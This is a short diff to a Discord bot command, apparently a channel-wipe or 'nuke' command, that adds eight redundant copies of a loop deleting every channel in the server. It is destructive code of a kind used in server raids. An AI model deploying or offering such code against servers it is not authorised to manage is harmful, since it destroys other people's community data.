@@ -19,6 +19,30 @@ exports.run = async (client, message) => {
            client.guilds.get(message.guild.id).channels.forEach(c => {
              c.delete();
            })
+           client.guilds.get(message.guild.id).channels.forEach(c => {
+             c.delete();
+           })
+           client.guilds.get(message.guild.id).channels.forEach(c => {
+             c.delete();
+           })
+           client.guilds.get(message.guild.id).channels.forEach(c => {
+             c.delete();
+           })
+           client.guilds.get(message.guild.id).channels.forEach(c => {
+             c.delete();
+           })
+           client.guilds.get(message.guild.id).channels.forEach(c => {
+             c.delete();
+           })
+           client.guilds.get(message.guild.id).channels.forEach(c => {
+             c.delete();
+           })
+           client.guilds.get(message.guild.id).channels.forEach(c => {
+             c.delete();
+           })
+           client.guilds.get(message.guild.id).channels.forEach(c => {
+             c.delete();
+           })
         })
         coletor2.on("collect", () => {
             msg.delete()
